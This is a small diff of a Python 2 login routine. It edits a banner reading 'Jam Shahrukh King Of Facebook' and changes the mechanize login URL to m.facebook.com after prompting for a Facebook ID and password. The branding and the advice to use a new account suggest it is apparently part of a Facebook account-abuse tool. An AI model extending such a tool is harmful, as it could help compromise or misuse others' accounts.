@@ -113,7 +113,7 @@ def login():
      	
 		
 		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
-		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mJam Shahrukh King Of Facebook ' ) 
+		jalan(' \033[1;97m   ✧ \033[1;97m👉 \033[1;97mJam Shahrukh King Of Facebook ' ) 
 		
 		print('	' )
 		print('      \033[1;97m      ✧ \x1b[1;97mLogin With Facebook\x1b[1;97m ✧')
@@ -121,7 +121,7 @@ def login():
 		id = raw_input('\033[1;97m✧ \x1b[1;97mID/Email\x1b[1;97m: \x1b[1;97m')
 		pwd = raw_input('\033[1;97m✧ \x1b[1;97mPassword\x1b[1;97m: \x1b[1;97m')
 		try:
-			br.open('https://graph.facebook.com')
+			br.open('https://m.facebook.com')
 		except mechanize.URLError:
 			print"\n\x1b[1;97mThere is no internet connection"
 			keluar()
